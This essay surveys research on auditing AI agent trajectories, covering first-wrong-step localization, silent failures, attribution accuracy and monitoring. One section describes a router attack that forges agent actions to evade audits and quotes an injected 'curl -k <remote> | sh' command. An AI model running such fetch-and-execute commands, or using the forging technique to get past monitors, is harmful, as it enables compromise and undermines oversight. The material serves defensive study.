Grade the trajectory, not the answer: localize the first wrong step

As of 2026-07, the useful unit of agent observability is not the final answer — it's the first step that went wrong. A run can end "correct" while resting on a broken intermediate step, and a long run can be right for the first stage and useless by the last. Independent groups working at every granularity — reasoning spans, pipeline stages, harness components, whole sessions — land on the same move: stop scoring the outcome, start localizing the break.

Two things have changed since this piece was last refreshed in mid-July, and both cut against comfort. The first is that the practice now has a field-scale justification: the modal agent failure emits no signal at all, so an outcome-keyed or exit-code-keyed monitor is blind to the plurality of defects. The second is that the practice now reports its own error rate, and it is bad — a majority of first-wrong-step attributions are wrong, and it is still the best move available. A third thread runs underneath both: the evidence these methods run on is itself fragile. Compaction removes it, agents under-instrument the code that produces it, a badly built instrument substitutes plausible values for it, and — new this week — an intermediary on the response path can rewrite it adversarially.

The through-line: an agent's own trajectory is the evidence; audit the run against it, find where it first diverged, treat that as a hypothesis rather than a fact, feed it into a recovery — and defend the evidence, because everything in the stack is quietly eroding it.

Why outcome monitoring cannot work: silence is the modal failure

The strongest argument for this whole map is not a method result. Across 255 hand-labeled agent-reactive bugs, the largest symptom class is Silent Errors at 108/255 (42.4%): the agent runs normally, produces a fluent answer or a modified workspace, and no exception, warning, retry, or non-zero exit fires. Crash is 71 (27.8%), Error-in-Output 34, Retry Loop 33, Hang 9 [T1] (Understanding Agent-Reactive Bugs at the Model-Harness Boundary).

The cross-tabulation is sharper than the headline. The two triggers that most reliably go silent are exactly the claims-versus-evidence mismatches this map proposes auditing: task-instruction non-compliance is silent in 81% of cases and statement fabrication in 90%. And note the sampling direction — a crash gets noticed and filed; a quiet wrong answer may never be attributed to the agent at all — so 42.4% is a lower bound.

The same shape shows up on the human side of the loop. In a field study of three production review agents across 341 repositories, only 1,056 of 15,652 unresolved comments drew any reply, so 93% of non-adoption is silent [T1] ("Go Home Copilot, You're Drunk"). And the status flag lies in the other direction: 114 of 470 sampled discussions are comments the developer acted on and never marked resolved. Instrument adoption from a lifecycle marker alone and you undercount by construction.

Practical consequence: any monitor keyed on exceptions, exit codes, or a lifecycle flag is watching the minority case. The signal has to come from comparing what the agent said against what its run actually did.

Score the first wrong step — and treat the answer as a hypothesis

Deep-research agents are the clean demonstration. TELBench reframes evaluation around first-wrong-step localization across 1,000 instances and 2,790 annotated trajectories, and DRIFT localizes the break by auditing each of the agent's claims against the evidence its own run gathered — flagging claims that reach the answer path unsupported or contradicted — for up to a 30-point gain in localization accuracy [T1] (Where Do Deep-Research Agents Go Wrong?). Don't judge each reasoning span for surface plausibility; track claims and bind each to evidence in the log.

The field also has a shared vocabulary for what an audit finds: an ontology of 11 process-defect types in 4 categories over a unified trajectory representation, plus a control-preservation axis (interpretable / interruptible / correctable / reversible), with agents at similar pass rates differing widely on process quality [T1] (ProcCtrlBench).

What is new, and what should change how you consume an attribution: the instrument reports its own precision, and it is a minority. Strict agent-and-step accuracy is 28.8% on a 9B backbone and 38.0% on a 27B one; naming the right agent alone reaches 56.0%, and landing within one step reaches 44.0% [T1] (AgentDebugX). So the honest statement of this map's core practice is that a majority of attributions are wrong and it is still the best move available.

That is not a reason to stop attributing. It is a reason to be careful about what consumes the output. Anything downstream that treats an attribution as ground truth — a training signal, a regression label, an automated rollback — is consuming a minority-correct estimate, which is the same failure shape as a self-improving harness bounded by its own proxy judge (agent-harness-architecture).

Close the loop: attribute, then rerun from the attributed point

Localization was a diagnosis for most of this map's life. It now has an operational payoff, priced. Organize debugging as Detect → Attribute → Recover → Rerun, with the rerun starting from the attributed checkpoint, and you repair 13 of 73 failed runs against Reflexion's 6, AutoManual's 5 and CRITIC's 4 — overall accuracy 55.8% → 63.6%, with the largest gain on multi-hop tasks (48.8 → 61.6) [T1] (AgentDebugX).

The gap is the whole argument for this map. All three baselines repair from the visible failure, which sits on average ten steps downstream of the cause. Two implementation details are worth stealing regardless of domain:

  • Deterministic rule packs run first, with LLM judgment escalated to only what the rules cannot decide. Same instinct as enforcing invariants mechanically rather than asking a model to be careful.
  • Attribution is a cost ladder, not a strategy: heuristics, one whole-trace pass, binary search, per-step inspection, budgeted ensembles at 12.8K tokens against 8.1K for a single pass. The authors decline to invoke the expensive path unconditionally, because on hosted backbones a single global reading is already stronger.

The trade-off is stated plainly by the authors: the +7.8 points bundle attribution with the rerun, so the two are not separately priced, and the attribution advantage disappears on hosted backbones — meaning the machinery is partly compensation for a weak diagnostician. This is GAIA and Who&When, not SWE.

The audit window is measured, and wide enough to act in

The error that decides a failed run lands at a median of step 7 out of ~27, while the first observable failure signal trails it by ~10 steps — from the largest manual failure anatomy to date, 1,794 trajectories and 63k+ annotated steps, 7 frontier models × 3 scaffolds, κ 0.78–0.94 [T1] (Failure as a Process). Two findings redirect the effort:

  • 57.9% of decisive errors are epistemic — the agent misused information already in its own trajectory (false premises alone are 30.7% of all failures). The catching evidence was in context.
  • 71% of successful runs also hit errors. Recovery, not error avoidance, separates outcomes. Optimizing for fewer errors optimizes the wrong variable.

At the session level the same move yields a kill signal: grading a whole run distribution (23,392 episodes, 396 tasks, 10 models) produces a Meltdown Onset Point past which an unattended run is not recovering and should be killed, with frontier models melting down on up to 19% of long runs [T1] (Beyond pass@1). Localize the break to debug; find the meltdown point to know when to stop.

The same move at production scale

The failure a static leaderboard hides is serial dependence. On production-like workflows where each stage depends on the last, completion decays 100% at the first stage to 20% at the last, with none of 15 frontier models finishing the pipeline — so localize the failing stage [T1] (Benchmarks are Not Enough: RAMP). Its operations counterpart runs trajectory monitoring across ~1M coding-agent tasks with trusted supervisor models reviewing a working agent's reasoning, actions and plans, graded on coverage / recall / time-to-response [T2] (Securing the future of AI agents).

Two 2026-07 additions push this from analysis into production engineering.

Put the telemetry in the system already built for it. One vendor specifies every automated approval, every tool call and every agent-to-agent message shipped to the SIEM together with the signals used and the human accountability record [T2] (How Anthropic secures its AI-native software development lifecycle). Two structural choices make it work: single-purpose agent identities at minimum permissions, so the actor of every logged action is unambiguous — which matters precisely because the modal bug emits no exception to attribute from — and agent-to-agent traffic routed through a monitored channel, without which one agent asking a peer to push code is not an event at all. Unmeasured: detection rate, time-to-response, false-positive burden, and log volume at agent-authored throughput.

Grade from state, not from the transcript. A computer-use study grades every task from database state and an audit log, never the transcript, plus a timestamped mutation log for segment-level ground truth; the authors report that their own early pilots scored from screenshots and were too ambiguous to use [T3] (Teach it to stop, not just to click). That is this map's principle pushed into environment design: build the environment so the claim and the evidence come from different channels. T3 and proprietary environments, so the posture is described rather than reproducible.

Observability as actuator — and its measured ceilings

The trajectory signal doesn't have to end at a diagnosis. Make a harness observable — represent editable components explicitly, distill trajectories into an evidence corpus, pair each proposed change with a prediction verified against outcome — and the same evidence that localizes failures drives a control loop that improves the system: 69.7% → 77.0% on Terminal-Bench 2 at 12% fewer tokens [T1] (Agentic Harness Engineering). A second group runs the loop with no labels at all, scoring candidates on execution-derived proxies [T1] (TTHE).

Three ceilings, in increasing order of how much they should worry you.

The judge is miscalibrated. TTHE's trace-driven judge commits a 50% harness when a 64% one sat in the pool it inspected. Trajectory evidence can drive the loop; it cannot tell the loop which way is up.

The most reliable consumer of a trajectory may not be a model at all. A hierarchical counterfactual search over the temporal structure of an agent's edits strips 17.9–32.9% of its patch while preserving the oracle on 99.1% of repairs, matching exhaustive delta debugging at 1.9× fewer validations [T1] (TRIM). No model reads the trajectory — which is why it never returns an invalid result, where prompting the agent with the same trajectory fails 3.8–44.9% of the time. A captured trajectory is not only evidence to audit claims against; it is a data structure with exploitable ordering.

Component telemetry beats run telemetry for deciding what to fix. Instrumenting a production verification loop end to end yields catch rate 0.20, fix rate 0.75, false-alarm rate ≈0 — and those three numbers say where the next point of reliability lives: raising catch was worth up to +8 pp, raising fix at most +0.5 pp [T3] (Where Does Agent Reliability Come From?). Vendor self-evaluation, single run, and the 32 missed errors are not coded by failure locus — so which component to fix is known, why it misses is not.

Applied to reviewer agents, the same decomposition finds planning is under 10% of every agent's effort and the only phase significantly associated with success, while heavy validation effort marks the reviews that fail [T1] (Agentic Code Review in the Terminal). Phases there are labelled by keyword matching over messages and tool descriptions — manually validated, but a reminder that a trajectory instrument is only as good as its annotation.

Defend the evidence: four ways the substrate erodes

Every method above assumes the run's evidence survives into the record. Four sources now say it often doesn't, and they are worth reading as one story.

Compaction removes it, and does so as a switch rather than a gradient. A killed process's exit code was in context, yet the summary promoted its partial stdout to "confirmed results" that persisted across sessions [T3] (Compaction as Epistemic Failure). A later probe found that across 246 summaries no summary ever carried a strict subset of ten planted facts — the first boundary dropped everything, even where the facts sat in the summarized context — and, worse, when task state decayed into an invented phase numbering, every subsequent summary restated the confabulation rather than checking it [T3] (Delivery, Not Storage). Summaries consolidate the agent's current beliefs; they do not validate them. Post-compaction, your audit runs on beliefs.

Some failures are silent by construction. When an agent mis-resolves an entity and a later step looks up something derived from it, the derived resolution is internally consistent given the wrong carried state — no exception, no contradiction, a correct operation on the wrong object. Drift hits 18% of eligible workflows with the per-step error rate rising 8% → 28% by step 3, detectable only by an independent re-derivation from the original request [T1] (Binding Drift). A checker reading the agent's state is checking the wrong thing. Relatedly, 86.4% of failed runs in one controlled study close with an explicit success message [T3] (How Agent Skills Fail under Long Contexts) — whose four-class coding of the first visible divergence (lost requirement, editing drift, failed checking, non-agent failure) is directly reusable for triage, and whose ordering rule — separate non-agent failures first — is what keeps you from charging the model for its harness.

Your instrument will substitute a plausible value unless you make it halt. New this week, and the cleanest statement of a principle this map had only implied. In a pre-registered study, three silent-corruption mechanisms were caught mechanically before any number reached a results file — a sandbox crash that would have laundered into a false all-survived zero, a scoping bug that stopped generated tests from being collected, scope-transcription errors — because the instrument had been progressively rebuilt to fail loud. The one that reached the counted data was an output-token ceiling that truncated replies and recorded them under an unrelated-sounding rejection note: no crash, no error, only a plausible wrong number. It inverted the study's headline finding and fell only to an adversarial review of the completed analysis [T1] (Adversarial Test-Hardening for AI-Written Code). The repair is mechanical and portable: one ceiling value read by both the request and a check; a reply at the ceiling raising a truncation error that is never retried; the round recorded honestly with its real billed cost and the raw truncated reply archived; a truncation at a measurement-defining step failing the cell as missing data rather than being silently recovered. Under the repaired instrument the same mechanism fired three more times within days and was scored rather than laundered — the event was never the problem, the laundering was.

And an intermediary can rewrite it on purpose. A third-party API router sits on the trusted path between an agent and its provider and can modify the response before the agent acts on it. At the subtler intervention levels it rewrites the visible explanation to agree with the injected tool call, or regenerates the whole reply from a mixed next-token distribution leaving no explicit edit boundary — so the forged action sits in the trajectory, consistent with its own narrative, and a claims-versus-evidence audit passes. Their case study injects curl -k <remote> | sh at turn 4 of an ordinary debugging task; it executes, no review fires, and because the injection landed early it reads as part of the workflow rather than as an anomaly [T1] (Where Is the Cost of Third-Party API Routers in Agentic Software Development?). The one artifact that would separate the tampered world from the honest one is the provider-side record of what was actually generated, and nobody logs it. Three task instances and a balanced 400-sample instrument, so read the architecture rather than the rates.

The other half: the agent won't instrument what it builds

Everything above concerns observing the agent. This limb concerns the product, and it is a negative. Across 4,550 agentic vs 3,276 human PRs in 81 repos, agents change logging less often than humans in 58.4% of repositories, and their apparent higher density is mostly a PR-size artifact — control for size and it collapses to 1.64 vs 1.59 logs per 1,000 LOC [T1] (Do AI Coding Agents Log Like Humans?). The gap is not uniform: agents match human practice in try/catch — the mechanical, pattern-matchable case — and diverge most in conditional branches (46.7% similar) and loops (41.5% similar), exactly where a human decides from context that a maintainer will need to know what happened.

Two facts make this load-bearing rather than a style note. Prose doesn't fix it: logging instructions appear in 4.7% of cases and are complied with 8.3% of the time from a repository context file, with instructed and uninstructed PRs statistically indistinguishable (p=0.25). Use deterministic guardrails — observability linters, CI checks — not instructions (runtime-action-governance). And humans silently backfill 72.5% of the missing instrumentation off-review, so the debt is real and invisible in the merge record (agentic-code-review).

What this half does not show is downstream cost: no incidents, no MTTR, no time-to-diagnose against agent-authored code. The gap is measured; that it hurts is inferred.

Where this connects

Trajectory grading is the review-side sibling of "don't trust the agent's 'done'" in agentic-code-review, and the merge/reject label is itself a mislocalized grade (only 35.7% of rejections are genuine agent failure). A harness evaluator that catches a broken step before it ships (agent-harness-architecture) is the constructive counterpart to localizing it afterwards. The trajectory substrate is also a measurement instrument: it is what reveals that 57% of one agent's benchmark wins retrieved the answer rather than derived it (evaluation-integrity), and a reconstructability twin asks whether a captured trace even licenses the decision a score claims — finding the replay precondition unmet in every real public trace it checked [T1] (Agent-Safety Evaluations as Load-Bearing Evidence). Cost per stage is itself an observability signal (model-routing-token-economics).

Open and contested

  • The instrument's own accuracy is the newest open problem. Strict first-wrong-step attribution is right 28.8–38.0% of the time. Nothing downstream should treat it as a label. How to bound or calibrate it — and what a usable confidence estimate on an attribution would look like — is unaddressed.
  • Nobody has a shared metric. The sources converge on the principle across reasoning spans, pipeline stages, harness components and whole sessions, so the mechanism replicates cross-org while no single localization metric is shared. "Grade the trajectory" is settled; "measure it thus" is not.
  • The actuator loop's judge stays unsolved. Miscalibrated at 50% committed vs 64% available, and label-free there is no ground-truth gate to fall back on.
  • Only one half of the map is priced. Agent under-instrumentation is measured as a behavior; its downstream cost (incidents, MTTR, debugging time) is unmeasured. The recursion — does first-wrong-step localization degrade in agent-authored code? — is a stated, unrun prediction, and the cheapest experiment in this map.
  • Always-on versus sampled auditing is still unquantified, and now doubly a tension: it is both the per-run debugging overhead and the self-evolving-harness corpus bottleneck.
  • Production telemetry is prescribed but unmeasured. No detection rate, no time-to-response, no false-positive burden, no log-volume accounting at agent-authored throughput.
  • Effect sizes are each their setup's — 30 points on deep-research, a collapse curve on one workload family, the step-7/lag-10 window on Terminal-Bench, 13/73 repairs on GAIA. The durable claims are directional.
